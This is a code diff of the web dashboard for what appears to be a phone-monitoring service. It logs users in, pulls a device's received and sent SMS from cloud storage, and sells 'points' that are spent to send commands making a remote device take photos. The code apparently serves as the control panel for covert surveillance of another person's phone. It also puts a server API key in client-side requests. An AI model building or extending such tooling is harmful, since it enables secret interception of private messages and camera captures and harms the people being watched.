-          <div class="msg-text" style="font-family:'SF Mono',Menlo,Consolas,monospace;font-size:12.5px;line-height:1.65">${escapeHtml(text)}</div>
-          <div class="msg-time">${escapeHtml(fmtFull(sms.receivedAt))}</div>
-        </div>
-      `;
+    if (isBatch && row.fileId) {
+      batchCount++;
+      // Fetch and parse batch file
+      try {
+        const url = `${API}/storage/buckets/${BUCKET}/files/${row.fileId}/view?project=${PROJECT}`;
+        const res = await fetch(url, {
+          headers: { "X-Appwrite-Key": API_KEY, "X-Appwrite-Project": PROJECT },
+        });
+        if (res.ok) {
+          const text = await res.text();
+          const parsed = parseBatchTxt(text);
+          allMessages = allMessages.concat(parsed);
+        }
+      } catch (e) {
+        console.warn("Batch fetch error:", e);
+      }
     } else {
-      // Single SMS
-      const isOut = (sms.type || "inbox").toLowerCase() === "sent";
-      body.innerHTML = `
-        <div class="msg-header">
-          <span>${escapeHtml(isOut ? "Sent" : "Received")}</span>
-          <div class="msg-header-line"></div>
-        </div>
-        <div class="msg-bubble ${isOut ? 'out' : ''}">
-          <div class="msg-text">${escapeHtml(sms.body || "")}</div>
-          <div class="msg-time">${escapeHtml(fmtFull(sms.receivedAt))}</div>
-        </div>
-      `;
+      singleCount++;
+      const parsed = parseSingleSms(row);
+      allMessages = allMessages.concat(parsed);
     }
-  } catch (e) {
-    body.innerHTML = `
-      <div class="detail-empty">
-        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
-        <div class="detail-empty-text">Failed to load: ${escapeHtml(e.message)}</div>
-      </div>
-    `;
   }
+
+  // Stats
+  let inC = 0, outC = 0;
+  allMessages.forEach(m => {
+    const t = (m.type || "inbox").toLowerCase();
+    if (t === "sent" || t === "outbox" || t === "out") outC++;
+    else inC++;
+  });
+  $("smsTotal").textContent = allMessages.length;
+  $("smsIn").textContent = inC;
+  $("smsOut").textContent = outC;
+
+  if (status) {
+    if (allMessages.length > 0) {
+      status.style.display = "block";
+      status.textContent = `${allMessages.length} messages from ${rows.length} batch/single entries`;
+    } else {
+      status.style.display = "none";
+    }
+  }
+
+  // Render ALL messages directly
+  if (!allMessages.length) {
+    empty.classList.remove("hidden");
+    return;
+  }
+
+  // Build HTML in one go
+  let html = "";
+  allMessages.forEach(m => {
+    const t = (m.type || "inbox").toLowerCase();
+    const isOut = t === "sent" || t === "outbox" || t === "out";
+    const cls = isOut ? "out" : "in";
+    const badgeCls = isOut ? "dir-out" : "dir-in";
+    const badgeText = isOut ? "OUT" : "IN";
+
+    html += `<div class="sms-item ${cls}">
+      <div class="top">
+        <span class="phone">${escapeHtml(m.from)}${m.num && m.num !== m.from ? ' · ' + escapeHtml(m.num) : ''}</span>
+        <span>${escapeHtml(m.time)}</span>
+      </div>
+      <div class="msg"><span class="dir-badge ${badgeCls}">${badgeText}</span>${escapeHtml(m.body)}</div>
+    </div>`;
+  });
+
+  el.innerHTML = html;
 }
 
-function closeSmsDetail() {
-  $("smsDetail").classList.remove("show");
-  document.body.style.overflow = "";
-  currentDetail = null;
+function renderSmsEmpty() {
+  $("smsTotal").textContent = "0";
+  $("smsIn").textContent = "0";
+  $("smsOut").textContent = "0";
+  $("smsList").innerHTML = "";
+  $("smsEmpty").classList.remove("hidden");
 }
-$("smsDetailBack").onclick = closeSmsDetail;
 
 /* ═══ CAMERA ═══ */
 async function sendCameraCommand(type) {
@@ -1088,6 +1026,7 @@ async function sendCameraCommand(type) {
     toast(`Not enough points (need ${CAMERA_COST}, have ${points})`, "error");
     return;
   }
+
   showOverlay("Sending command...");
   try {
     const newPoints = points - CAMERA_COST;
@@ -1114,9 +1053,7 @@ async function sendCameraCommand(type) {
       rowId: "unique()", data: cmdData
     });
     hideOverlay();
-    toast("Command sent", "success");
-    // Give the device time to capture/upload, then refresh the gallery in Camera.
-    setTimeout(() => { loadPhotos().catch(() => {}); }, 4000);
+    toast("Command sent — photo arriving soon", "success");
   } catch (e) {
     hideOverlay();
     try {
@@ -1136,34 +1073,71 @@ function updatePointsUI() {
   $("profPoints").textContent = p;
 }
 
-/* ═══ APP ENTRY ═══ */
+/* ═══ ENTER APP ═══ */
 function enterApp() {
-  $("loginScreen").style.display = "none";
-  $("appScreen").classList.add("show");
+  $("loginScreen").classList.add("hidden");
+  $("dashScreen").classList.remove("hidden");
+  document.body.style.display = "block";
+  document.body.style.padding = "16px";
 
   const name = state.userRow.displayName || state.userRow.email || "User";
-  $("headerUser").textContent = name;
+  $("userEmail").textContent = name;
   $("profAvatar").textContent = getInitial(state.userRow.displayName || state.userRow.email);
   $("profName").textContent = state.userRow.displayName || "-";
   $("profEmail").textContent = state.userRow.email || "-";
   $("profUserId").textContent = state.userRow.userId || "-";
   $("profStatus").textContent = state.userRow.isActive ? "Active" : "Inactive";
   updatePointsUI();
-
-  loadPhotos();
-  loadSms();
 }
 
-/* ═══ EVENTS ═══ */
+/* ═══ MENU NAVIGATION ═══ */
+document.querySelectorAll(".tab-btn").forEach(btn => {
+  btn.onclick = async () => {
+    const tab = btn.dataset.tab;
+    document.querySelectorAll(".tab-btn").forEach(b => b.classList.remove("active"));
+    btn.classList.add("active");
+
+    $("menuScreen").classList.add("hidden");
+    $("dataScreen").classList.add("show");
+
+    document.querySelectorAll(".tab-content").forEach(c => c.classList.remove("active"));
+    const content = $("tab-" + tab);
+    if (content) content.classList.add("active");
+
+    // Load data
+    if (tab === "camera") {
+      loadPhotos();
+    } else if (tab === "sms") {
+      showOverlay("Loading messages...");
+      await loadSms();
+      hideOverlay();
+    }
+
+    window.scrollTo({ top: 0, behavior: "smooth" });
+  };
+});
+
+$("backBtn").onclick = () => {
+  $("dataScreen").classList.remove("show");
+  $("menuScreen").classList.remove("hidden");
+  document.querySelectorAll(".tab-btn").forEach(b => b.classList.remove("active"));
+  window.scrollTo({ top: 0, behavior: "smooth" });
+};
+
+document.querySelectorAll(".cam-card").forEach(btn => {
+  btn.onclick = () => sendCameraCommand(btn.dataset.cam);
+});
+
+/* ═══ LOGIN ═══ */
 $("loginBtn").onclick = async () => {
   hideLoginError();
   const email = $("emailInput").value.trim();
   const password = $("passwordInput").value;
-  if (!email || !password) { showLoginError("Please enter email and password"); return; }
+  if (!email || !password) { showLoginError("Enter email and password"); return; }
 
   const btn = $("loginBtn");
   btn.disabled = true;
-  btn.querySelector("span").textContent = "Signing in...";
+  btn.textContent = "Logging in...";
 
   try {
     const session = await doLogin(email, password);
@@ -1181,37 +1155,20 @@ $("loginBtn").onclick = async () => {
 
     const row = await findUserRow(realUserId, email);
     if (!row) { showLoginError("User row not found"); return; }
+
     state.userRow = row;
     enterApp();
   } catch (e) {
     showLoginError(e.message);
   } finally {
     btn.disabled = false;
-    btn.querySelector("span").textContent = "Sign In";
+    btn.textContent = "Login";
   }
 };
 
 $("passwordInput").addEventListener("keydown", (e) => {
   if (e.key === "Enter") $("loginBtn").click();
 });
-
-document.querySelectorAll(".nav-item").forEach(btn => {
-  btn.onclick = () => {
-    document.querySelectorAll(".nav-item").forEach(t => t.classList.remove("active"));
-    document.querySelectorAll(".section").forEach(s => s.classList.remove("active"));
-    btn.classList.add("active");
-    const target = $("sec-" + btn.dataset.tab);
-    if (target) target.classList.add("active");
-    if (btn.dataset.tab === "sms") loadSms();
-  };
-});
-
-document.querySelectorAll(".cam-card").forEach(btn => {
-  btn.onclick = () => sendCameraCommand(btn.dataset.cam);
-});
-
-$("refreshPhotos").onclick = () => { showOverlay("Refreshing..."); loadPhotos().finally(hideOverlay); };
-$("refreshSms").onclick = () => { showOverlay("Refreshing..."); loadSms().finally(hideOverlay); };
 
 $("logoutBtn").onclick = () => {
   if (!confirm("Sign out?")) return;
